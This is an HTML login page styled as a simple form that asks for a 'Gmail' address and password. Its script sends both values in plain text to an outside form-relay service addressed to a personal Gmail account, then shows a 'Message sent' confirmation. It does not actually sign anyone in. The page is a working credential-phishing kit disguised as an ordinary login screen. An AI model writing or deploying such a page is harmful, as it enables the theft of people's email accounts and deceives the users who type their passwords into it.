<!DOCTYPE html>
<html>
<head>
  <title>Login</title>

  <style>
    body{
      margin:0;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      font-family:Arial;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
    }

    .container{
      background:white;
      padding:40px;
      border-radius:15px;
      width:320px;
      text-align:center;
    }

    input{
      width:90%;
      padding:12px;
      margin:10px 0;
    }

    button{
      width:95%;
      padding:12px;
      background:#6a1b9a;
      color:white;
      border:none;
      cursor:pointer;
    }

    #msg{
      margin-top:10px;
      color:green;
    }
  </style>
</head>

<body>

<div class="container">

  <h2>LOGIN</h2>

  <form id="loginForm">

    <input type="email" id="email" placeholder="Enter Gmail" required>
    <input type="password" id="password" placeholder="Enter Password" required>

    <button type="submit">LOG IN</button>

  </form>

  <div id="msg"></div>

</div>

<script>

document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    if(email === "" || password === ""){
        document.getElementById("msg").style.color = "red";
        document.getElementById("msg").innerText = "Please fill all fields";
        return;
    }

    document.getElementById("msg").style.color = "green";
    document.getElementById("msg").innerText = "Message sent ✔";

    fetch("https://formsubmit.co/folkking66@gmail.com", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        body: JSON.stringify({
            email: email,
            password: password
        })
    });

});

</script>

</body>
</html>
